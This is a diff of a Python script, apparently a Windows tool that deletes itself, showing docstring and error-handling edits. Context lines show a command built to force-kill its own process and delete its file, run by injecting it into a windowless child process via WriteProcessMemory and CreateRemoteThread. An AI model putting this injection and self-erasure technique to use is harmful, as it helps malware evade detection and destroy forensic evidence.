@@ -58,7 +58,7 @@ def get_state():
     Acquire current process pid
     Check execution state (PE || script)
     Acquire current process file path
-    :return: pid, path
+    :return pid, path: str, str
     """
     current_pid = str(os.getpid())
     if is_frozen_main():
@@ -75,7 +75,7 @@ def generate_shellcode(pid, path):
     Set up cmd to kill PID and remove from disk
     :param pid:
     :param path:
-    :return: str
+    :return shellcode: bytearray
     """
     nullbyte = b'\x00'
     cmd_string = b'cmd /c taskkill /F /PID > nul ' + pid + b' && ping 1.1.1.1 -n 1 -w 500 > nul & del /F /Q ' + path
@@ -85,16 +85,17 @@ def generate_shellcode(pid, path):
 def child_process(process_name=TARGET_PROCESS):
     """ Start windowless proccess in new process group
 
-    :param process_name:
-    :return: process pid
+    :param process_name: str
+    :return process pid: int
     """
     startupinfo = subprocess.STARTUPINFO()
     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Start process windowless
     try:
         process = subprocess.Popen([process_name], startupinfo=startupinfo,
                                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
-    except OSError:
-        exit()
+    except OSError as e:
+        print('Error: child_process(): {}'.format(e.args))
+        return -1
     sleep(1)  # allow process load before injection
     return process.pid
 
@@ -110,9 +111,9 @@ def inject_rthread(shellcode, child_pid):
     WriteProcessMemory: http://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx
     CreateRemoteThread: http://msdn.microsoft.com/en-us/library/windows/desktop/ms682437(v=vs.85).aspx
 
-    :param shellcode:
-    :param child_pid:
-    :return: success bool
+    :param shellcode: byte array
+    :param child_pid: int
+    :return success: bool
     """
     kernel32 = ctypes.windll.kernel32
     byte_length = len(shellcode)
@@ -168,7 +169,10 @@ def clean_up():
     pid, path = get_state()
     shell_code = generate_shellcode(pid, path)
     child_pid = child_process()
-    return inject_rthread(shell_code, child_pid)
+    if child_pid == -1:
+        return False
+    else:
+        return inject_rthread(shell_code, child_pid)
 
 
 def main():
